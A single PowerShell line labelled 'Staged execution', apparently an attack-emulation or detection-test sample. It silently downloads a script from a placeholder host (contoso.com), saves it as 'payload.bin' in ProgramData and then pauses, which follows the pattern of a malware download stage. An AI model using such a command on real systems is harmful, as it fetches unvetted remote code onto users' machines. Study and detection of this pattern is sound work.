
<# Staged execution #> $TransferUrl = "https://contoso.com/updater.ps1"; $WorkingPath = 'C:\ProgramData\payload.bin'; curl.exe -s -L -o $WorkingPath $TransferUrl; Start-Sleep -Seconds 45
